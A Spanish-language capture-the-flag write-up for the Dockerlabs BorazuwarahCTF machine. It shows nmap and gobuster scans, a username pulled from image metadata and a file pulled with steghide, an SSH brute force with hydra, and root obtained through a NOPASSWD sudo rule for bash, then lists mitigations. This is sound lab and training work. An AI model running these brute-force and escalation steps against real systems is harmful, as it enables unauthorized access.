# 🛠️ Lab: [borazuwarahctf]

> [!summary] 📊 Resumen 
> 
> 
> - **Máquina:** BorazuwarahCTF
> - **Plataforma:** Dockerlabs
> - **Sistema Operativo:** Linux (Debian)
> - **Dificultad:** Muy Fácil
> - **Vector de Acceso:** Exposición de información en metadatos + Fuerza Bruta SSH.
> - **Vector de Escalada:** Mala configuración de privilegios `sudo` (Abuso de `/bin/bash`).
> - **Servicios Expuestos:** SSH (22), HTTP (80).

---

## 📝 Lista de Tareas

- [ ] **1. Escaneo Inicial**
    *Lanzamos un escaneo general con nmap.*
    ```bash
    sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn 172.17.0.2
    ```


- Encontramos 2 servicios funcionado, con sus respectivos puertos abiertos.
  ![[Pasted image 20260215222226.png]]
  
- [ ] **2. Escaneo a posibles vulnerabilidades especificas**
    *Utilizamos un escaneo con nmap dirigido a los puertos/servicios encontrados..*
    ```bash
    sudo nmap -p22 --script=vuln 172.17.0.2
    
    sudo nmap -p80 --script=vuln 172.17.0.2
    ```

![[Pasted image 20260215222948.png]]
- No se encuentra alguna posibilidad de intrusión con los anteriores escaneos. 

- [ ] **3. Se ingresa al sitio web**
    *Se continua investigando indicios de vulnerabilidades*
    ```text
    http://172.17.0.2/
    ```

![[Pasted image 20260215224811.png]]
- Al acceder con la dirección ip de la pagina desde una web nos encontramos con la siguiente imagen.
- Revisamos el código de la pagina para encontrar mas información.       
    ```bash
    curl http://172.17.0.2
    ```

![[Pasted image 20260215231226.png]]
- Nos devuelve un HTML con una imagen en su interior.
- Probamos con gobuster haber que directorios almacena la web.
    ```Bash
    gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
    ```

![[Pasted image 20260215232530.png]]
- Nos muestra que solo tenemos acceso a la misma pagina de antes, nos enfocaremos en la única pista hasta el momento.
- [ ] **4. Vamos a descargar y analizar la imagen del HTML de la pagina**
    *Descargamos la imagen.*
    ```bash
    wget http://172.17.0.2/imagen.jpeg
    ```
- Utilizamos herramientas de reconocimiento sobre el archivo descargado.
    ```bash
    #Confirmamos que tipo de archivo es.
    file imagen.jpeg
    #Revisamos sus metadatos
    exiftool imagen.jpeg
    #Revisamos si hay algun archivo o script oculo dentro de la imagen ()
    steghide info imagen.jpeg
    ```
- Con el primer comando, hemos validado que se trata de una imagen.
- Con el segundo comando, hemos encontrado en su descripción un usuario:
  ![[Pasted image 20260215234302.png]]
- Con el tercer comando, hemos encontrado que en el interior de la imagen hay un archivo txt oculto.
  ![[Pasted image 20260215234757.png]]
- *Ahora con ese nombre de usuario y ese archivo txt vamos a empezar a probar que encontramos, utilizamos los siguientes comandos para extraer y mirar el contenido del archivo txt.*
    ```bash
    steghide extract -sf imagen.jpeg
    
    cat secreto.txt
    ```

![[Pasted image 20260215235506.png]]
- Observamos que por el lado del txt no obtuvimos mas información.

- [ ] **5. Validación de posibles vectores de vulnerabilidad**
    *Encontramos un usuario de la investigación anterior, y el puerto 22 de ssh abierto, probaremos un ataque de fuerza bruta con hydra.*
    ```bash
    #Probamos con el usuario root sin exito... 
    hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
    #Ahora si probamos con el usuario obtenido de los metadatos de la imagen.
    hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
    ```
- Vemos que nos encuentra la contraseña de ese usuario. 
  ![[Pasted image 20260216002008.png]]
- [ ] **4. Escalada de privilegios**
    *Una vez ingresemos por ssh al usuario que ya habíamos encontrado anteriormente debemos de realizar otra investigación, haber si nos hacemos con el premio grande.*
    ```bash
    #Comando de acceso por ssh
    ssh borazuwarah@172.17.0.2
    ```
- Usamos sudo -l para ver que permisos tiene nuestro usuario actual.
  ![[Pasted image 20260216002932.png]]
- Encontramos que este usuario puede ejecutar una bash sin que le pidan contraseña, ejecutamos una bash y vemos la magia: 
  ![[Pasted image 20260216003354.png]]
---
> [!success] 🏁 Conclusión del Ejercicio
> 
> 
> La máquina fue comprometida encadenando tres fallos críticos de seguridad:
> 1. **Fuga de Información:** El desarrollador dejó el nombre de usuario (`borazuwarah`) expuesto en los metadatos de una imagen pública en el servidor web.
> 2. **Políticas de Contraseñas Débiles:** El usuario utilizaba una contraseña predecible (`123456`) susceptible a ataques de diccionario.
> 3. **Principio de Menor Privilegio Violado:** El usuario tenía permisos en el archivo `sudoers` para ejecutar una terminal de comandos (`/bin/bash`) como administrador sin necesidad de autenticación.configuración de permisos
>    

> [!tip] 🛠️ Recomendaciones y Mitigaciones (Blue Team)
> 
> 
> - **Sanitización Web:** Implementar rutinas automáticas para limpiar metadatos (EXIF) de todos los recursos multimedia antes de subirlos a producción.
> - **Bastionado SSH:** Deshabilitar la autenticación por contraseña en SSH y exigir el uso de llaves criptográficas (Public Key Authentication). Alternativamente, implementar herramientas como `Fail2Ban` para bloquear ataques de fuerza bruta.
> - **Auditoría de Sudoers:** Revocar inmediatamente el permiso `NOPASSWD` para `/bin/bash` del usuario `borazuwarah`. Auditar el archivo `/etc/sudoers` para asegurar que solo los administradores estrictamente necesarios tengan privilegios de ejecución.
